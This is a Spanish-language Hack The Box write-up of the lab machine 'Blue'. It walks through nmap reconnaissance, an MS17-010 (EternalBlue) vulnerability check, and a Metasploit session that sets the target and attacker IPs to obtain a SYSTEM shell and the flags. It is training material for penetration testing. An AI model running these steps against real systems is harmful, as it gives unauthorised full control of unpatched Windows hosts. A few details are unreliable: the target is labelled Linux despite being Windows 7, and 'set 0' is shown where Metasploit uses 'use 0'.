---
layout: single
title: Blue: Hack The Box
excerpt: "Aprenderemos sobre que es y como explotar la vulnerabilidad: **Eternal Blue**. Ganaremos una shell con RCE privilegiada sin tener credenciales. Conoceremos el CVE-MS17-010, cual explota gracias a la versión de SMBv1."
date: 2025-10-01
classes: wide
header:
  teaser: /assets/images/htb-writeup-blue/logo_blue.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - Hackthebox
  - Pentesting
  - Eternalblue
  - eJPTv2
tags:
  - writeup
  - eJPTv2
  - smb
  - EternalBlue
  - CVE-MS17-010
  - Metasploit
  - RemoteAccessRCE
  - EscaladaPrivilegios
---

## WRITE UP
IP VÍCTIMA-> 10.10.10.40 (víctima) TTL= 127 LINUX

### RECONOCIMIENTO

Lo primero que vamos hacer es crear nuestro entorno de trabajo: <span style="color:lightblue">blue</span>

Dentro usaremos la herramienta de s4vitar *mkt* cual nos generara las carpetas necesarias para tener todo más organizado; **Nmap...**

Para empezar el reconocimiento, enviamos una traza ICMP a la <span style="color:red">IP</span> de la maquina víctima, para comprobar que tenemos conectividad, tenemos dos alternativas:

-Usar el script *whichSystem* que nos dirá directamente el equipo al que estamos atacando, por ende habrá tenido ping para dar la respuesta. Es más silencioso que nmap.

```bash
whichSystem.py 10.10.10.40
```

-Usar el comando *ping*: 

```bash
ping -c1 10.10.10.40 -R
# -R Lo que hace es un record route que consiste que a la hora de hacer la petición se lo envía a un nodo intermediario para que no sea directa la petición, al ser windows no muestra el prceso* 
```

Después de confirmar que tenemos conectividad, usaremos **nmap** para a ver que puertos tenemos abiertos y que protocolos/servicios tenemos.

```bash
nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 10.10.10.40 -oG allPorts
# Veremos porque el formato grapeable, es importante.
```

Una vez hecho, usaremos otra herramienta de s4vitar *extractports* al archivo allPorts
cual nos copiara los puertos, y escanearlos con nmap. 

```bash
extractports.sh allPorts
```

```bash
nmap -sVC -p135,139,445,49152,49153,49154,49155,49156,49157 10.10.10.40 -oN targeted
#  El formato -oN lo emplearemos con batcat lenguaje java para verlo mejor
#  Nos mostrará la versión de los servicios que están corriendo
#  Usará scripts defaults definidos en lua
```

Una vez escaneado, usaremos batcat:
>https://github.com/sharkdp/bat.git

```bash
batcat targeted -l java
# Nos mostrara la salida en un formato más bonito, con java
```

### VULNERABILIDAD SMB: ETERNAL BLUE

Al estar en  un Windows antiguo (En este caso Windows 7 Professional) podemos usar el script de **nmap**  "vuln and safe" para comprobar si es vulnerable a *EternalBlue*.

```bash
nmap --script "vuln and safe" -vvv -p445 10.10.10.40 -oN bluevuln
```

En el escaneo nos saldrá **VULNERABLE** que nos informa de una vulnerabilidad de smb que nos permite **RCE** debido a que usa una versión muy antigua de smb, la v1. -> [CVE-2017-0143](https://www.avast.com/es-es/c-eternalblue)

### CONFIGURACIÓN EXPLOIT ETERNALBLUE VIA METASPLOIT

Usaremos *Metasploit* para configurar un exploit y conseguir una Shell sin necesitar credenciales de ningún usuario.

```bash
# Abrir Metasploit
msfconsole

# Buscar el Módulo de Eternal Blue
search eternal blue
```

Usaremos el primer exploit, por ejemplo.

``set 0``

Veremos que valores tenemos que configurar:

``show options``

Tendremos que agregar la IP del host víctima y host atacante:

```bash
# Establecer la IP de la máquina objetivo
set RHOSTS 10.10.10.40

# Establecer la IP de nuestra máquina atacante
set LHOST 10.10.14.26
```

Ahora ejecutamos el exploit.

``run`` o ``exploit``

Nos dará una Shell y estaremos con privilegios como  <span style="color:blue">NT AUTHORITY\SYSTEM</span>

``getuid``

### BANDERA USER

Nos vamos al usuario <span style="color:blue">haris</span> y cogemos su bandera en el escritorio.

### BANDERA ROOT

Nos vamos al usuario <span style="color:blue">Administrator</span> y cogemos su bandera en el escritorio.

